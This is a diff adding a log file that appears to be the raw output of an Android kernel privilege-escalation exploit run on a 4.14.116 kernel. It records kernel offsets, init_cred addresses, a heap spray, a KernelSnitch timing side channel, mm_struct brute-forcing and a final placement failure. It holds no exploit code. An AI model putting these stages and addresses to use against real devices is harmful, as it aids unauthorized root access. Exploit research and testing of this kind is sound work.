@@ -1,0 +1,128 @@
+[*] kernel: 4.14.116
+[+] offsets matched: 4.14.116
+[*] init_cred image=ffffff800aebc9a8 alias=ffffffff82ebc9a8
+[+] startup context pid=8056 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=8056 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[+] build config pid=8056 label=ghostlock_oneplus slide=pselect main=pselect
+[+] p0 profile pid=8056 phys_offset=0000000080000000 kernel_phys_load=0000000000080000 delta=ffffffff80080000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[*] p0 kernel_phys_load=0000000000080000 phys_offset=0000000080000000 delta=ffffffff80080000
+[*] [T+0ms] exploit start
+[*] UMH path: fops redirect (mode=4)...
+[*] [T+1269ms] pre-UMH drain
+[*] === fops redirect === target=0xffffffff8303e378 mode=4
+[*] [T+1269ms]   heap spray start
+[*] KernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[*] KernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[*] start finding collisisons
+[*] target    0000007ba85cc0c8
+[*] pass1 slow candidates: 730
+[*]   0000006ba7c01130 t1=506315 t2=845
+[*]   0000006ba7c02138 t1=65 t2=1562
+[*]   0000006ba7e3f320 t1=65 t2=1041
+[*]   0000006ba7fa9e70 t1=65 t2=1496
+[*]   0000006ba80e7860 t1=260 t2=1432
+[*]   0000006ba818cd88 t1=65 t2=1497
+[*]   0000006ba8206158 t1=506770 t2=780
+[*]   0000006ba8343b40 t1=65 t2=1562
+[*]   0000006ba83e4048 t1=455 t2=1041
+[*]   0000006ba8447360 t1=455 t2=1236
+[*]   0000006ba84975e0 t1=517448 t2=975
+[*]   0000006ba86342c8 t1=455 t2=1562
+[*]   0000006ba866b480 t1=195 t2=1041
+[*]   0000006ba8951bb0 t1=65 t2=1236
+[*]   0000006ba8a181e8 t1=65 t2=1041
+[*]   0000006ba8a513b0 t1=455 t2=1562
+[*]   0000006ba8b72cb8 t1=325 t2=1562
+[*]   0000006ba8bdaff8 t1=390 t2=1041
+[*]   0000006ba8c161d8 t1=195 t2=1041
+[*]   0000006ba8e1c208 t1=511133 t2=846
+[*]   0000006ba8e1e218 t1=130 t2=1562
+[*]   0000006ba8fbdf10 t1=455 t2=1562
+[*]   0000006ba92f18b0 t1=130 t2=1562
+[*]   0000006ba9327a60 t1=504101 t2=780
+[*]   0000006ba9404148 t1=130 t2=1041
+[*]   0000006ba9408168 t1=455 t2=1562
+[*]   0000006ba95109a8 t1=455 t2=1562
+[*]   0000006ba9539af0 t1=130 t2=1431
+[*]   0000006ba9625250 t1=520 t2=1562
+[*]   0000006ba96734c0 t1=325 t2=1171
+[*]   0000006ba97d2fb8 t1=65 t2=1367
+[*]   0000006ba97f00a8 t1=260 t2=1302
+[*]   0000006ba9ad57d0 t1=390 t2=1562
+[*]   0000006ba9bc4f48 t1=195 t2=1497
+[*]   0000006ba9fc0f28 t1=520 t2=1301
+[*]   0000006baa022238 t1=65 t2=1171
+[*]   0000006baa1fb100 t1=65 t2=1237
+[*]   0000006baa58ed98 t1=455 t2=1562
+[*]   0000006baa83e318 t1=65 t2=520
+[*]   0000006baa957be0 t1=455 t2=520
+[*]   0000006baac764d8 t1=505403 t2=0
+[*]   0000006bab197de0 t1=65 t2=520
+[*]   0000006bab63a2f8 t1=629557 t2=0
+[*]   0000006bab6a2638 t1=518164 t2=0
+[*]   0000006bab6c4748 t1=130 t2=520
+[*]   0000006bab77bd00 t1=390 t2=520
+[*]   0000006babc84548 t1=455 t2=520
+[*]   0000006babec3740 t1=520 t2=520
+[*]   0000006babf90da8 t1=130 t2=520
+[*]   0000006bac3199f0 t1=130 t2=520
+[*]   0000006bac3d8fe8 t1=65 t2=520
+[*]   0000006bac9a4e48 t1=195 t2=520
+[*]   0000006baca744c8 t1=520 t2=520
+[*]   0000006bad02d290 t1=325 t2=520
+[*]   0000006bad2573e0 t1=520 t2=520
+[*]   0000006bad28a578 t1=504947 t2=0
+[*]   0000006bad2e8868 t1=130 t2=520
+[*]   0000006bad424248 t1=260 t2=520
+[*]   0000006bad807160 t1=503385 t2=0
+[*]   0000006bad99be00 t1=130 t2=520
+[*]   0000006bad9d0fa8 t1=65 t2=520
+[*]   0000006badad17b0 t1=195 t2=520
+[*]   0000006badbf50d0 t1=390 t2=520
+[*]   0000006badc80528 t1=455 t2=520
+[*]   0000006bae1f80e8 t1=325 t2=520
+[*]   0000006bae4a4648 t1=504427 t2=0
+[*]   0000006bae52ea98 t1=65 t2=520
+[*]   0000006bae64a378 t1=195 t2=520
+[*]   0000006bae7b0ea8 t1=130 t2=520
+[*]   0000006bae8915b0 t1=195 t2=520
+[*]   0000006bae96dc90 t1=195 t2=520
+[*]   0000006bae9fa0f8 t1=517773 t2=0
+[*]   0000006baea2d290 t1=520 t2=520
+[*]   0000006baedff120 t1=260 t2=520
+[*]   0000006baf24c388 t1=390 t2=520
+[*]   0000006baf3189e8 t1=390 t2=520
+[*]   0000006baf589d70 t1=325 t2=520
+[*]   0000006bb0157be0 t1=503580 t2=0
+[*]   0000006bb0563c40 t1=260 t2=520
+[*]   0000006bb0745b50 t1=195 t2=520
+[*]   0000006bb0a0e198 t1=65 t2=520
+[*]   0000006bb0a25250 t1=520 t2=520
+[*]   0000006bb0d39af0 t1=195 t2=520
+[*]   0000006bb0e583e8 t1=325 t2=520
+[*]   0000006bb10111b0 t1=390 t2=520
+[*]   0000006bb10c7760 t1=325 t2=520
+[*]   0000006bb1125a50 t1=195 t2=520
+[*]   0000006bb1150ba8 t1=130 t2=520
+[*]   0000006bb1208168 t1=65 t2=520
+[*]   0000006bb12342c8 t1=325 t2=520
+[*]   0000006bb12b46c8 t1=325 t2=520
+[*]   0000006bb1391db0 t1=709244 t2=0
+[*]   0000006bb18553d0 t1=501952 t2=0
+[*] found 15 collisisons
+[*] KernelSnitch collisions: found
+[*] start bruteforcing
+[*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[*] KernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff80568bc740
+[*] done
+[*] prepare_kernel_page ok attempt=1
+[*] [T+74137ms]   heap spray done
+[-] pselect cannot place tree_left waiter_word=2 global_word=-5 words_per_set=5 nfds=320
